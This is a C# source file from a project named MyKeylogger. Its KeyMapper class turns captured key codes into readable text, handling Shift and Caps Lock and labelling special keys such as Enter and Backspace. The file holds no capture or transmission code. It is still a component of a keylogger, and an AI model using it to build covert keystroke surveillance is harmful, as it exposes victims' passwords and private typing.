﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MyKeylogger
{
    internal class KeyMapper
    {
        private readonly List<KeyMap> KeyMapList = new List<KeyMap>();
        public KeyMapper()
        {
            AddKeyToList(Keys.Back, " {Backspace} ");
            AddKeyToList(Keys.Return, " {ENTER} " + Environment.NewLine);
            AddKeyToList(Keys.Capital, string.Empty);
            AddKeyToList(Keys.Space, " ");
            AddKeyToList(Keys.Tab, "\t");
            AddKeyToList(Keys.LMenu, " {ALT} ");
            AddKeyToList(Keys.Alt, " {ALT} ");
            AddKeyToList(Keys.LWin, string.Empty);
            AddKeyToList(Keys.RWin, string.Empty);
            AddKeyToList(Keys.NumLock, string.Empty);
            AddKeyToList(Keys.Scroll, string.Empty);
            AddKeyToList(Keys.PrintScreen, " {PRINTSCREEN} ");
            AddKeyToList(Keys.Control, string.Empty);
            AddKeyToList(Keys.Pause, string.Empty);
            AddKeyToList(Keys.PageDown, string.Empty);
            AddKeyToList(Keys.PageUp, string.Empty);
            AddKeyToList(Keys.Insert, string.Empty);
            AddKeyToList(Keys.Home, " {HOME} ");
            AddKeyToList(Keys.End, " {END} ");
            AddKeyToList(Keys.LShiftKey, string.Empty);
            AddKeyToList(Keys.RShiftKey, string.Empty);

            AddKeyToList(Keys.D0, "0", ")");
            AddKeyToList(Keys.D1, "1", "!");
            AddKeyToList(Keys.D2, "2", "@");
            AddKeyToList(Keys.D3, "3", "#");
            AddKeyToList(Keys.D4, "4", "$");
            AddKeyToList(Keys.D5, "5", "%");
            AddKeyToList(Keys.D6, "6", "^");
            AddKeyToList(Keys.D7, "7", "&");
            AddKeyToList(Keys.D8, "8", "*");
            AddKeyToList(Keys.D9, "9", "(");

            AddKeyToList(Keys.OemSemicolon, ";", ":");
            AddKeyToList(Keys.OemOpenBrackets, "[", "{");
            AddKeyToList(Keys.OemCloseBrackets, "]", "}");
            AddKeyToList(Keys.OemPeriod, ".", ">");
            AddKeyToList(Keys.Oem5, "\\", "|");
            AddKeyToList(Keys.OemBackslash, "\\", "|");
            AddKeyToList(Keys.Oem7, "'", "\"");
            AddKeyToList(Keys.OemQuestion, "/", "?");
            AddKeyToList(Keys.Oemcomma, ",", "<");
            AddKeyToList(Keys.Oemplus, "=", "+");
            AddKeyToList(Keys.OemMinus, "-", "_");
            AddKeyToList(Keys.Oemtilde, "`", "~");
        }
        private void AddKeyToList(Keys key, string original, string modified = null) =>
            KeyMapList.Add(new KeyMap(key, original, modified));

        public string GetKeyText(Keys key)
        {
            foreach (var map in KeyMapList.Where(map => map.Key == key))
            {

                if (Keys.LShiftKey.IsKeyPressed() || Keys.RShiftKey.IsKeyPressed())
                {
                    return map.Modified;
                }

                return map.Original;
            }

            if (Keys.LShiftKey.IsKeyPressed() || Keys.RShiftKey.IsKeyPressed() || Keys.CapsLock.IsKeyToggled())
            {

                return key.ToString().ToUpper();
            }

            return key.ToString().ToLower();

        }
    }
}
